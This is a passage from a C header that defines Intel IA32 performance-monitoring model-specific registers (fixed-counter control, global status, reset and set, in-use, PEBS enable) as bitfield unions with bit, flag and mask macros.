#define IA32_PERF_CAPABILITIES_FREEZE_WHILE_SMM_IS_SUPPORTED_BIT 12
#define IA32_PERF_CAPABILITIES_FREEZE_WHILE_SMM_IS_SUPPORTED_FLAG 0x1000
#define IA32_PERF_CAPABILITIES_FREEZE_WHILE_SMM_IS_SUPPORTED_MASK 0x01
#define IA32_PERF_CAPABILITIES_FREEZE_WHILE_SMM_IS_SUPPORTED(_) (((_) >> 12) & 0x01)

    /**
     * [Bit 13] Full width of counter writable via IA32_A_PMCx.
     */
    UINT64 FullWidthCounterWrite : 1;
#define IA32_PERF_CAPABILITIES_FULL_WIDTH_COUNTER_WRITE_BIT 13
#define IA32_PERF_CAPABILITIES_FULL_WIDTH_COUNTER_WRITE_FLAG 0x2000
#define IA32_PERF_CAPABILITIES_FULL_WIDTH_COUNTER_WRITE_MASK 0x01
#define IA32_PERF_CAPABILITIES_FULL_WIDTH_COUNTER_WRITE(_) (((_) >> 13) & 0x01)
    UINT64 Reserved1 : 50;
  };

  UINT64 Flags;
} IA32_PERF_CAPABILITIES_REGISTER;

/**
 * @brief Fixed-Function Performance Counter Control <b>(R/W)</b>
 *
 * Fixed-Function Performance Counter Control. Counter increments while the results of ANDing
 * respective enable bit in IA32_PERF_GLOBAL_CTRL with the corresponding OS or USR bits in this MSR
 * is true.
 *
 * @remarks If CPUID.0AH: EAX[7:0] > 1
 */
#define IA32_FIXED_CTR_CTRL 0x0000038D
typedef union {
  struct {
    /**
     * [Bit 0] EN0_OS: Enable Fixed Counter 0 to count while CPL = 0.
     */
    UINT64 En0Os : 1;
#define IA32_FIXED_CTR_CTRL_EN0_OS_BIT 0
#define IA32_FIXED_CTR_CTRL_EN0_OS_FLAG 0x01
#define IA32_FIXED_CTR_CTRL_EN0_OS_MASK 0x01
#define IA32_FIXED_CTR_CTRL_EN0_OS(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] EN0_Usr: Enable Fixed Counter 0 to count while CPL > 0.
     */
    UINT64 En0Usr : 1;
#define IA32_FIXED_CTR_CTRL_EN0_USR_BIT 1
#define IA32_FIXED_CTR_CTRL_EN0_USR_FLAG 0x02
#define IA32_FIXED_CTR_CTRL_EN0_USR_MASK 0x01
#define IA32_FIXED_CTR_CTRL_EN0_USR(_) (((_) >> 1) & 0x01)

    /**
     * [Bit 2] AnyThread: When set to 1, it enables counting the associated event conditions
     * occurring across all logical processors sharing a processor core. When set to 0, the counter
     * only increments the associated event conditions occurring in the logical processor which
     * programmed the MSR.
     */
    UINT64 AnyThread0 : 1;
#define IA32_FIXED_CTR_CTRL_ANY_THREAD0_BIT 2
#define IA32_FIXED_CTR_CTRL_ANY_THREAD0_FLAG 0x04
#define IA32_FIXED_CTR_CTRL_ANY_THREAD0_MASK 0x01
#define IA32_FIXED_CTR_CTRL_ANY_THREAD0(_) (((_) >> 2) & 0x01)

    /**
     * [Bit 3] EN0_PMI: Enable PMI when fixed counter 0 overflows.
     */
    UINT64 En0Pmi : 1;
#define IA32_FIXED_CTR_CTRL_EN0_PMI_BIT 3
#define IA32_FIXED_CTR_CTRL_EN0_PMI_FLAG 0x08
#define IA32_FIXED_CTR_CTRL_EN0_PMI_MASK 0x01
#define IA32_FIXED_CTR_CTRL_EN0_PMI(_) (((_) >> 3) & 0x01)

    /**
     * [Bit 4] EN1_OS: Enable Fixed Counter 1 to count while CPL = 0.
     */
    UINT64 En1Os : 1;
#define IA32_FIXED_CTR_CTRL_EN1_OS_BIT 4
#define IA32_FIXED_CTR_CTRL_EN1_OS_FLAG 0x10
#define IA32_FIXED_CTR_CTRL_EN1_OS_MASK 0x01
#define IA32_FIXED_CTR_CTRL_EN1_OS(_) (((_) >> 4) & 0x01)

    /**
     * [Bit 5] EN1_Usr: Enable Fixed Counter 1 to count while CPL > 0.
     */
    UINT64 En1Usr : 1;
#define IA32_FIXED_CTR_CTRL_EN1_USR_BIT 5
#define IA32_FIXED_CTR_CTRL_EN1_USR_FLAG 0x20
#define IA32_FIXED_CTR_CTRL_EN1_USR_MASK 0x01
#define IA32_FIXED_CTR_CTRL_EN1_USR(_) (((_) >> 5) & 0x01)

    /**
     * [Bit 6] AnyThread: When set to 1, it enables counting the associated event conditions
     * occurring across all logical processors sharing a processor core. When set to 0, the counter
     * only increments the associated event conditions occurring in the logical processor which
     * programmed the MSR.
     *
     * @remarks If CPUID.0AH: EAX[7:0] > 2
     */
    UINT64 AnyThread1 : 1;
#define IA32_FIXED_CTR_CTRL_ANY_THREAD1_BIT 6
#define IA32_FIXED_CTR_CTRL_ANY_THREAD1_FLAG 0x40
#define IA32_FIXED_CTR_CTRL_ANY_THREAD1_MASK 0x01
#define IA32_FIXED_CTR_CTRL_ANY_THREAD1(_) (((_) >> 6) & 0x01)

    /**
     * [Bit 7] EN1_PMI: Enable PMI when fixed counter 1 overflows.
     */
    UINT64 En1Pmi : 1;
#define IA32_FIXED_CTR_CTRL_EN1_PMI_BIT 7
#define IA32_FIXED_CTR_CTRL_EN1_PMI_FLAG 0x80
#define IA32_FIXED_CTR_CTRL_EN1_PMI_MASK 0x01
#define IA32_FIXED_CTR_CTRL_EN1_PMI(_) (((_) >> 7) & 0x01)

    /**
     * [Bit 8] EN2_OS: Enable Fixed Counter 2 to count while CPL = 0.
     */
    UINT64 En2Os : 1;
#define IA32_FIXED_CTR_CTRL_EN2_OS_BIT 8
#define IA32_FIXED_CTR_CTRL_EN2_OS_FLAG 0x100
#define IA32_FIXED_CTR_CTRL_EN2_OS_MASK 0x01
#define IA32_FIXED_CTR_CTRL_EN2_OS(_) (((_) >> 8) & 0x01)

    /**
     * [Bit 9] EN2_Usr: Enable Fixed Counter 2 to count while CPL > 0.
     */
    UINT64 En2Usr : 1;
#define IA32_FIXED_CTR_CTRL_EN2_USR_BIT 9
#define IA32_FIXED_CTR_CTRL_EN2_USR_FLAG 0x200
#define IA32_FIXED_CTR_CTRL_EN2_USR_MASK 0x01
#define IA32_FIXED_CTR_CTRL_EN2_USR(_) (((_) >> 9) & 0x01)

    /**
     * [Bit 10] AnyThread: When set to 1, it enables counting the associated event conditions
     * occurring across all logical processors sharing a processor core. When set to 0, the counter
     * only increments the associated event conditions occurring in the logical processor which
     * programmed the MSR.
     *
     * @remarks If CPUID.0AH: EAX[7:0] > 2
     */
    UINT64 AnyThread2 : 1;
#define IA32_FIXED_CTR_CTRL_ANY_THREAD2_BIT 10
#define IA32_FIXED_CTR_CTRL_ANY_THREAD2_FLAG 0x400
#define IA32_FIXED_CTR_CTRL_ANY_THREAD2_MASK 0x01
#define IA32_FIXED_CTR_CTRL_ANY_THREAD2(_) (((_) >> 10) & 0x01)

    /**
     * [Bit 11] EN2_PMI: Enable PMI when fixed counter 2 overflows.
     */
    UINT64 En2Pmi : 1;
#define IA32_FIXED_CTR_CTRL_EN2_PMI_BIT 11
#define IA32_FIXED_CTR_CTRL_EN2_PMI_FLAG 0x800
#define IA32_FIXED_CTR_CTRL_EN2_PMI_MASK 0x01
#define IA32_FIXED_CTR_CTRL_EN2_PMI(_) (((_) >> 11) & 0x01)
    UINT64 Reserved1 : 52;
  };

  UINT64 Flags;
} IA32_FIXED_CTR_CTRL_REGISTER;

/**
 * Global Performance Counter Status.
 *
 * @remarks If CPUID.0AH: EAX[7:0] > 0
 */
#define IA32_PERF_GLOBAL_STATUS 0x0000038E
typedef union {
  struct {
    /**
     * [Bit 0] Ovf_PMC0: Overflow status of IA32_PMC0.
     *
     * @remarks If CPUID.0AH: EAX[15:8] > 0
     */
    UINT64 OvfPmc0 : 1;
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC0_BIT 0
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC0_FLAG 0x01
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC0_MASK 0x01
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC0(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] Ovf_PMC1: Overflow status of IA32_PMC1.
     *
     * @remarks If CPUID.0AH: EAX[15:8] > 1
     */
    UINT64 OvfPmc1 : 1;
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC1_BIT 1
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC1_FLAG 0x02
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC1_MASK 0x01
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC1(_) (((_) >> 1) & 0x01)

    /**
     * [Bit 2] Ovf_PMC2: Overflow status of IA32_PMC2.
     *
     * @remarks If CPUID.0AH: EAX[15:8] > 2
     */
    UINT64 OvfPmc2 : 1;
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC2_BIT 2
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC2_FLAG 0x04
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC2_MASK 0x01
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC2(_) (((_) >> 2) & 0x01)

    /**
     * [Bit 3] Ovf_PMC3: Overflow status of IA32_PMC3.
     *
     * @remarks If CPUID.0AH: EAX[15:8] > 3
     */
    UINT64 OvfPmc3 : 1;
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC3_BIT 3
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC3_FLAG 0x08
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC3_MASK 0x01
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC3(_) (((_) >> 3) & 0x01)
    UINT64 Reserved1 : 28;

    /**
     * [Bit 32] Ovf_FixedCtr0: Overflow status of IA32_FIXED_CTR0.
     *
     * @remarks If CPUID.0AH: EAX[7:0] > 1
     */
    UINT64 OvfFixedctr0 : 1;
#define IA32_PERF_GLOBAL_STATUS_OVF_FIXEDCTR0_BIT 32
#define IA32_PERF_GLOBAL_STATUS_OVF_FIXEDCTR0_FLAG 0x100000000
#define IA32_PERF_GLOBAL_STATUS_OVF_FIXEDCTR0_MASK 0x01
#define IA32_PERF_GLOBAL_STATUS_OVF_FIXEDCTR0(_) (((_) >> 32) & 0x01)

    /**
     * [Bit 33] Ovf_FixedCtr1: Overflow status of IA32_FIXED_CTR1.
     *
     * @remarks If CPUID.0AH: EAX[7:0] > 1
     */
    UINT64 OvfFixedctr1 : 1;
#define IA32_PERF_GLOBAL_STATUS_OVF_FIXEDCTR1_BIT 33
#define IA32_PERF_GLOBAL_STATUS_OVF_FIXEDCTR1_FLAG 0x200000000
#define IA32_PERF_GLOBAL_STATUS_OVF_FIXEDCTR1_MASK 0x01
#define IA32_PERF_GLOBAL_STATUS_OVF_FIXEDCTR1(_) (((_) >> 33) & 0x01)

    /**
     * [Bit 34] Ovf_FixedCtr2: Overflow status of IA32_FIXED_CTR2.
     *
     * @remarks If CPUID.0AH: EAX[7:0] > 1
     */
    UINT64 OvfFixedctr2 : 1;
#define IA32_PERF_GLOBAL_STATUS_OVF_FIXEDCTR2_BIT 34
#define IA32_PERF_GLOBAL_STATUS_OVF_FIXEDCTR2_FLAG 0x400000000
#define IA32_PERF_GLOBAL_STATUS_OVF_FIXEDCTR2_MASK 0x01
#define IA32_PERF_GLOBAL_STATUS_OVF_FIXEDCTR2(_) (((_) >> 34) & 0x01)
    UINT64 Reserved2 : 20;

    /**
     * [Bit 55] Trace_ToPA_PMI: A PMI occurred due to a ToPA entry memory buffer that was completely
     * filled.
     *
     * @remarks If (CPUID.(EAX=07H, ECX=0):EBX[25] = 1) && IA32_RTIT_CTL.ToPA = 1
     */
    UINT64 TraceTopaPmi : 1;
#define IA32_PERF_GLOBAL_STATUS_TRACE_TOPA_PMI_BIT 55
#define IA32_PERF_GLOBAL_STATUS_TRACE_TOPA_PMI_FLAG 0x80000000000000
#define IA32_PERF_GLOBAL_STATUS_TRACE_TOPA_PMI_MASK 0x01
#define IA32_PERF_GLOBAL_STATUS_TRACE_TOPA_PMI(_) (((_) >> 55) & 0x01)
    UINT64 Reserved3 : 2;

    /**
     * [Bit 58] LBR_Frz. LBRs are frozen due to:
     * * IA32_DEBUGCTL.FREEZE_LBR_ON_PMI=1.
     * * The LBR stack overflowed.
     *
     * @remarks If CPUID.0AH: EAX[7:0] > 3
     */
    UINT64 LbrFrz : 1;
#define IA32_PERF_GLOBAL_STATUS_LBR_FRZ_BIT 58
#define IA32_PERF_GLOBAL_STATUS_LBR_FRZ_FLAG 0x400000000000000
#define IA32_PERF_GLOBAL_STATUS_LBR_FRZ_MASK 0x01
#define IA32_PERF_GLOBAL_STATUS_LBR_FRZ(_) (((_) >> 58) & 0x01)

    /**
     * [Bit 59] CTR_Frz. Performance counters in the core PMU are frozen due to:
     * * IA32_DEBUGCTL.FREEZE_PERFMON_ON_PMI=1.
     * * One or more core PMU counters overflowed.
     *
     * @remarks If CPUID.0AH: EAX[7:0] > 3
     */
    UINT64 CtrFrz : 1;
#define IA32_PERF_GLOBAL_STATUS_CTR_FRZ_BIT 59
#define IA32_PERF_GLOBAL_STATUS_CTR_FRZ_FLAG 0x800000000000000
#define IA32_PERF_GLOBAL_STATUS_CTR_FRZ_MASK 0x01
#define IA32_PERF_GLOBAL_STATUS_CTR_FRZ(_) (((_) >> 59) & 0x01)

    /**
     * [Bit 60] ASCI: Data in the performance counters in the core PMU may include contributions
     * from the direct or indirect operation Intel SGX to protect an enclave.
     *
     * @remarks If CPUID.(EAX=07H, ECX=0):EBX[2] = 1
     */
    UINT64 Asci : 1;
#define IA32_PERF_GLOBAL_STATUS_ASCI_BIT 60
#define IA32_PERF_GLOBAL_STATUS_ASCI_FLAG 0x1000000000000000
#define IA32_PERF_GLOBAL_STATUS_ASCI_MASK 0x01
#define IA32_PERF_GLOBAL_STATUS_ASCI(_) (((_) >> 60) & 0x01)

    /**
     * [Bit 61] Uncore counter overflow status.
     *
     * @remarks If CPUID.0AH: EAX[7:0] > 2
     */
    UINT64 OvfUncore : 1;
#define IA32_PERF_GLOBAL_STATUS_OVF_UNCORE_BIT 61
#define IA32_PERF_GLOBAL_STATUS_OVF_UNCORE_FLAG 0x2000000000000000
#define IA32_PERF_GLOBAL_STATUS_OVF_UNCORE_MASK 0x01
#define IA32_PERF_GLOBAL_STATUS_OVF_UNCORE(_) (((_) >> 61) & 0x01)

    /**
     * [Bit 62] OvfBuf: DS SAVE area Buffer overflow status.
     *
     * @remarks If CPUID.0AH: EAX[7:0] > 0
     */
    UINT64 OvfBuf : 1;
#define IA32_PERF_GLOBAL_STATUS_OVF_BUF_BIT 62
#define IA32_PERF_GLOBAL_STATUS_OVF_BUF_FLAG 0x4000000000000000
#define IA32_PERF_GLOBAL_STATUS_OVF_BUF_MASK 0x01
#define IA32_PERF_GLOBAL_STATUS_OVF_BUF(_) (((_) >> 62) & 0x01)

    /**
     * [Bit 63] CondChgd: Status bits of this register have changed.
     *
     * @remarks If CPUID.0AH: EAX[7:0] > 0
     */
    UINT64 CondChgd : 1;
#define IA32_PERF_GLOBAL_STATUS_COND_CHGD_BIT 63
#define IA32_PERF_GLOBAL_STATUS_COND_CHGD_FLAG 0x8000000000000000
#define IA32_PERF_GLOBAL_STATUS_COND_CHGD_MASK 0x01
#define IA32_PERF_GLOBAL_STATUS_COND_CHGD(_) (((_) >> 63) & 0x01)
  };

  UINT64 Flags;
} IA32_PERF_GLOBAL_STATUS_REGISTER;

/**
 * @brief Global Performance Counter Control <b>(R/W)</b>
 *
 * Global Performance Counter Control. Counter increments while the result of ANDing the respective
 * enable bit in this MSR with the corresponding OS or USR bits in the general-purpose or fixed
 * counter control MSR is true.
 *
 * @remarks If CPUID.0AH: EAX[7:0] > 0
 */
#define IA32_PERF_GLOBAL_CTRL 0x0000038F
typedef struct {
  /**
   * EN_PMC(n). Enable bitmask. Only the first n-1 bits are valid. Bits 31:n are reserved.
   *
   * @remarks If CPUID.0AH: EAX[15:8] > n
   */
  UINT32 EnPmcn;

  /**
   * EN_FIXED_CTR(n). Enable bitmask. Only the first n-1 bits are valid. Bits 31:n are reserved.
   *
   * @remarks If CPUID.0AH: EDX[4:0] > n
   */
  UINT32 EnFixedCtrn;
} IA32_PERF_GLOBAL_CTRL_REGISTER;

/**
 * Global Performance Counter Overflow Reset Control.
 *
 * @remarks If CPUID.0AH: EAX[7:0] > 3
 */
#define IA32_PERF_GLOBAL_STATUS_RESET 0x00000390
typedef union {
  struct {
    /**
     * [Bits 31:0] Set 1 to clear Ovf_PMC(n) bit. Clear bitmask. Only the first n-1 bits are valid.
     * Bits 31:n are reserved.
     *
     * @remarks If CPUID.0AH: EAX[15:8] > n
     */
    UINT64 ClearOvfPmcn : 32;
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_PMCN_BIT 0
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_PMCN_FLAG 0xFFFFFFFF
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_PMCN_MASK 0xFFFFFFFF
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_PMCN(_) (((_) >> 0) & 0xFFFFFFFF)

    /**
     * [Bits 34:32] Set 1 to clear Ovf_FIXED_CTR(n) bit. Clear bitmask. Only the first n-1 bits are
     * valid. Bits 31:n are reserved.
     *
     * @remarks If CPUID.0AH: EDX[4:0] > n
     */
    UINT64 ClearOvfFixedCtrn : 3;
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_FIXED_CTRN_BIT 32
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_FIXED_CTRN_FLAG 0x700000000
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_FIXED_CTRN_MASK 0x07
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_FIXED_CTRN(_) (((_) >> 32) & 0x07)
    UINT64 Reserved1 : 20;

    /**
     * [Bit 55] Set 1 to clear Trace_ToPA_PMI bit.
     *
     * @remarks If (CPUID.(EAX=07H, ECX=0):EBX[25] = 1) && IA32_RTIT_CTL.ToPA = 1
     */
    UINT64 ClearTraceTopaPmi : 1;
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_TRACE_TOPA_PMI_BIT 55
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_TRACE_TOPA_PMI_FLAG 0x80000000000000
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_TRACE_TOPA_PMI_MASK 0x01
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_TRACE_TOPA_PMI(_) (((_) >> 55) & 0x01)
    UINT64 Reserved2 : 2;

    /**
     * [Bit 58] Set 1 to clear LBR_Frz bit.
     *
     * @remarks If CPUID.0AH: EAX[7:0] > 3
     */
    UINT64 ClearLbrFrz : 1;
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_LBR_FRZ_BIT 58
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_LBR_FRZ_FLAG 0x400000000000000
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_LBR_FRZ_MASK 0x01
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_LBR_FRZ(_) (((_) >> 58) & 0x01)

    /**
     * [Bit 59] Set 1 to clear CTR_Frz bit.
     *
     * @remarks If CPUID.0AH: EAX[7:0] > 3
     */
    UINT64 ClearCtrFrz : 1;
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_CTR_FRZ_BIT 59
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_CTR_FRZ_FLAG 0x800000000000000
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_CTR_FRZ_MASK 0x01
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_CTR_FRZ(_) (((_) >> 59) & 0x01)

    /**
     * [Bit 60] Set 1 to clear ASCI bit.
     *
     * @remarks If CPUID.0AH: EAX[7:0] > 3
     */
    UINT64 ClearAsci : 1;
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_ASCI_BIT 60
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_ASCI_FLAG 0x1000000000000000
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_ASCI_MASK 0x01
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_ASCI(_) (((_) >> 60) & 0x01)

    /**
     * [Bit 61] Set 1 to clear Ovf_Uncore bit.
     *
     * @remarks 06_2EH
     */
    UINT64 ClearOvfUncore : 1;
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_UNCORE_BIT 61
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_UNCORE_FLAG 0x2000000000000000
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_UNCORE_MASK 0x01
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_UNCORE(_) (((_) >> 61) & 0x01)

    /**
     * [Bit 62] Set 1 to clear OvfBuf bit.
     *
     * @remarks If CPUID.0AH: EAX[7:0] > 0
     */
    UINT64 ClearOvfBuf : 1;
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_BUF_BIT 62
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_BUF_FLAG 0x4000000000000000
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_BUF_MASK 0x01
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_BUF(_) (((_) >> 62) & 0x01)

    /**
     * [Bit 63] Set 1 to clear CondChgd bit.
     *
     * @remarks If CPUID.0AH: EAX[7:0] > 0
     */
    UINT64 ClearCondChgd : 1;
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_COND_CHGD_BIT 63
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_COND_CHGD_FLAG 0x8000000000000000
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_COND_CHGD_MASK 0x01
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_COND_CHGD(_) (((_) >> 63) & 0x01)
  };

  UINT64 Flags;
} IA32_PERF_GLOBAL_STATUS_RESET_REGISTER;

/**
 * Global Performance Counter Overflow Set Control.
 *
 * @remarks If CPUID.0AH: EAX[7:0] > 3
 */
#define IA32_PERF_GLOBAL_STATUS_SET 0x00000391
typedef union {
  struct {
    /**
     * [Bits 31:0] Set 1 to cause Ovf_PMC(n) = 1. Set bitmask. Only the first n-1 bits are valid.
     * Bits 31:n are reserved.
     *
     * @remarks If CPUID.0AH: EAX[15:8] > n
     */
    UINT64 OvfPmcn : 32;
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_PMCN_BIT 0
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_PMCN_FLAG 0xFFFFFFFF
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_PMCN_MASK 0xFFFFFFFF
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_PMCN(_) (((_) >> 0) & 0xFFFFFFFF)

    /**
     * [Bits 34:32] Set 1 to cause Ovf_FIXED_CTR(n) = 1. Set bitmask. Only the first n-1 bits are
     * valid. Bits 31:n are reserved.
     *
     * @remarks If CPUID.0AH: EDX[4:0] > n
     */
    UINT64 OvfFixedCtrn : 3;
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_FIXED_CTRN_BIT 32
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_FIXED_CTRN_FLAG 0x700000000
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_FIXED_CTRN_MASK 0x07
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_FIXED_CTRN(_) (((_) >> 32) & 0x07)
    UINT64 Reserved1 : 20;

    /**
     * [Bit 55] Set 1 to cause Trace_ToPA_PMI = 1.
     *
     * @remarks If CPUID.0AH: EAX[7:0] > 3
     */
    UINT64 TraceTopaPmi : 1;
#define IA32_PERF_GLOBAL_STATUS_SET_TRACE_TOPA_PMI_BIT 55
#define IA32_PERF_GLOBAL_STATUS_SET_TRACE_TOPA_PMI_FLAG 0x80000000000000
#define IA32_PERF_GLOBAL_STATUS_SET_TRACE_TOPA_PMI_MASK 0x01
#define IA32_PERF_GLOBAL_STATUS_SET_TRACE_TOPA_PMI(_) (((_) >> 55) & 0x01)
    UINT64 Reserved2 : 2;

    /**
     * [Bit 58] Set 1 to cause LBR_Frz = 1.
     *
     * @remarks If CPUID.0AH: EAX[7:0] > 3
     */
    UINT64 LbrFrz : 1;
#define IA32_PERF_GLOBAL_STATUS_SET_LBR_FRZ_BIT 58
#define IA32_PERF_GLOBAL_STATUS_SET_LBR_FRZ_FLAG 0x400000000000000
#define IA32_PERF_GLOBAL_STATUS_SET_LBR_FRZ_MASK 0x01
#define IA32_PERF_GLOBAL_STATUS_SET_LBR_FRZ(_) (((_) >> 58) & 0x01)

    /**
     * [Bit 59] Set 1 to cause CTR_Frz = 1.
     *
     * @remarks If CPUID.0AH: EAX[7:0] > 3
     */
    UINT64 CtrFrz : 1;
#define IA32_PERF_GLOBAL_STATUS_SET_CTR_FRZ_BIT 59
#define IA32_PERF_GLOBAL_STATUS_SET_CTR_FRZ_FLAG 0x800000000000000
#define IA32_PERF_GLOBAL_STATUS_SET_CTR_FRZ_MASK 0x01
#define IA32_PERF_GLOBAL_STATUS_SET_CTR_FRZ(_) (((_) >> 59) & 0x01)

    /**
     * [Bit 60] Set 1 to cause ASCI = 1.
     *
     * @remarks If CPUID.0AH: EAX[7:0] > 3
     */
    UINT64 Asci : 1;
#define IA32_PERF_GLOBAL_STATUS_SET_ASCI_BIT 60
#define IA32_PERF_GLOBAL_STATUS_SET_ASCI_FLAG 0x1000000000000000
#define IA32_PERF_GLOBAL_STATUS_SET_ASCI_MASK 0x01
#define IA32_PERF_GLOBAL_STATUS_SET_ASCI(_) (((_) >> 60) & 0x01)

    /**
     * [Bit 61] Set 1 to cause Ovf_Uncore = 1.
     *
     * @remarks 06_2EH
     */
    UINT64 OvfUncore : 1;
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_UNCORE_BIT 61
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_UNCORE_FLAG 0x2000000000000000
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_UNCORE_MASK 0x01
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_UNCORE(_) (((_) >> 61) & 0x01)

    /**
     * [Bit 62] Set 1 to cause OvfBuf = 1.
     *
     * @remarks If CPUID.0AH: EAX[7:0] > 3
     */
    UINT64 OvfBuf : 1;
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_BUF_BIT 62
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_BUF_FLAG 0x4000000000000000
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_BUF_MASK 0x01
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_BUF(_) (((_) >> 62) & 0x01)
    UINT64 Reserved3 : 1;
  };

  UINT64 Flags;
} IA32_PERF_GLOBAL_STATUS_SET_REGISTER;

/**
 * Indicator that core perfmon interface is in use.
 *
 * @remarks If CPUID.0AH: EAX[7:0] > 3
 */
#define IA32_PERF_GLOBAL_INUSE 0x00000392
typedef union {
  struct {
    /**
     * [Bits 31:0] IA32_PERFEVTSEL(n) in use. Status bitmask. Only the first n-1 bits are valid.
     * Bits 31:n are reserved.
     *
     * @remarks If CPUID.0AH: EAX[15:8] > n
     */
    UINT64 Ia32PerfevtselnInUse : 32;
#define IA32_PERF_GLOBAL_INUSE_IA32_PERFEVTSELN_IN_USE_BIT 0
#define IA32_PERF_GLOBAL_INUSE_IA32_PERFEVTSELN_IN_USE_FLAG 0xFFFFFFFF
#define IA32_PERF_GLOBAL_INUSE_IA32_PERFEVTSELN_IN_USE_MASK 0xFFFFFFFF
#define IA32_PERF_GLOBAL_INUSE_IA32_PERFEVTSELN_IN_USE(_) (((_) >> 0) & 0xFFFFFFFF)

    /**
     * [Bits 34:32] IA32_FIXED_CTR(n) in use. Status bitmask. Only the first n-1 bits are valid.
     * Bits 31:n are reserved.
     */
    UINT64 Ia32FixedCtrnInUse : 3;
#define IA32_PERF_GLOBAL_INUSE_IA32_FIXED_CTRN_IN_USE_BIT 32
#define IA32_PERF_GLOBAL_INUSE_IA32_FIXED_CTRN_IN_USE_FLAG 0x700000000
#define IA32_PERF_GLOBAL_INUSE_IA32_FIXED_CTRN_IN_USE_MASK 0x07
#define IA32_PERF_GLOBAL_INUSE_IA32_FIXED_CTRN_IN_USE(_) (((_) >> 32) & 0x07)
    UINT64 Reserved1 : 28;

    /**
     * [Bit 63] PMI in use.
     */
    UINT64 PmiInUse : 1;
#define IA32_PERF_GLOBAL_INUSE_PMI_IN_USE_BIT 63
#define IA32_PERF_GLOBAL_INUSE_PMI_IN_USE_FLAG 0x8000000000000000
#define IA32_PERF_GLOBAL_INUSE_PMI_IN_USE_MASK 0x01
#define IA32_PERF_GLOBAL_INUSE_PMI_IN_USE(_) (((_) >> 63) & 0x01)
  };

  UINT64 Flags;
} IA32_PERF_GLOBAL_INUSE_REGISTER;

/**
 * PEBS Control.
 *
 * @remarks If CPUID.0AH: EAX[7:0] > 3
 */
#define IA32_PEBS_ENABLE 0x000003F1
typedef union {
  struct {
    /**
     * [Bit 0] Enable PEBS on IA32_PMC0.
     *
     * @remarks 06_0FH
     */
    UINT64 EnablePebs : 1;
#define IA32_PEBS_ENABLE_ENABLE_PEBS_BIT 0
#define IA32_PEBS_ENABLE_ENABLE_PEBS_FLAG 0x01
#define IA32_PEBS_ENABLE_ENABLE_PEBS_MASK 0x01
#define IA32_PEBS_ENABLE_ENABLE_PEBS(_) (((_) >> 0) & 0x01)

    /**
     * [Bits 3:1] Reserved or model specific.
     */
    UINT64 Reservedormodelspecific1 : 3;
#define IA32_PEBS_ENABLE_RESERVEDORMODELSPECIFIC1_BIT 1
#define IA32_PEBS_ENABLE_RESERVEDORMODELSPECIFIC1_FLAG 0x0E
